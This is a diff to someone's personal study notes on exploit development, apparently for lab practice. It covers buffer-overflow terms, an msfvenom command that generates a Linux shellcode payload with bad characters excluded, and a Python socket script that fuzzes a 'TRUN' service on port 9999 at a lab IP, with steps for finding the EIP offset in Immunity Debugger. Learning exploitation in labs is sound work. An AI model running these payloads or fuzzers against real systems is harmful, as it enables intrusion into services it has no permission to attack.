@@ -260,7 +260,7 @@ double click on where was found>> again>>right click on values to translate  >>o
 
 patch instrution, rightclick, patch instruction>>export with different name to test
 ****************************************************************************************************************************************************************************
-                                                            Exploit Devepolment 
+                                                            Exploit Devepolment Linux
 
 Buffer Overflow Common Terms
 Heap                        Memory that can be allocated and deallocated
@@ -336,8 +336,32 @@ Vulnerable functions: printf, fgets
 
 msfvenom -p linux/x86/exec CMD="cat /.hidden/inventory.exe" -b "\x00\xfe\x20\x0a\xff" -f python
 
+************************************************************************************************************************************************************************************************************
+                                                              Exploit Devepolment Windows
+on windows
+  open immunity debugger, press play
+on linux
+                                                            #!/usr/bin/python
+                                                            import socket
+                                                            
+                                                            ##Fuzz
+                                                            buf = "TRUN /.:/"
+                                                            #buf += "A" * 3000
+                                                            
+                                                            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # create the IPv4 socket, TCP protocol
+                                                            s.connect(("10.50.141.22", 9999)) #connect to target IP and port
+                                                            print s.recv(1024) #print response
+                                                            s.send(buf) #send the value of buf
+                                                            print s.recv(1024) #print response
+                                                            s.close() #close the socket
+## run script
 
-
+wire mask>> tools>> buffer overflow>> put the 3000 >>copy into script under #buf =+ "A" * 3000 
+                                                            buf += "     vkhglbiuhgkuio gygh g uy      "
+rewind, play, run updated script
+get eip from widnows immuniy>> put value into wiremask
+on script                                                   buf += "A * 2003 #which is result from wiremask
+BAKC TO POWERSHELL
 
 
 
